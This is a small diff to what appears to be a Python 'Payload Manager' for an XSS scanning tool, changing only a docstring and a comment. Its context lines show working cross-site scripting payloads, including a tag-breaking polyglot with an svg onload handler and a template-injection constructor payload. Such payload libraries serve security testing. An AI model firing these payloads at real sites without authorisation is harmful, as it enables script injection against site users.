@@ -3,7 +3,7 @@
 """
 Payload Manager
 
-Central manager for the comprehensive XSS payload library.
+Central manager for the XSS payload library.
 
 Company: EasyProTech LLC (www.easypro.tech)
 Dev: Brabus
@@ -229,7 +229,7 @@ class PayloadManager:
             '<script>[].constructor.constructor("alert(1)")()</script>',
         ]
         
-        # Add polyglots and advanced payloads
+        # Add polyglots and payloads
         top_payloads.extend([
             'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>',
             '{{constructor.constructor(\'alert(1)\')()}}',
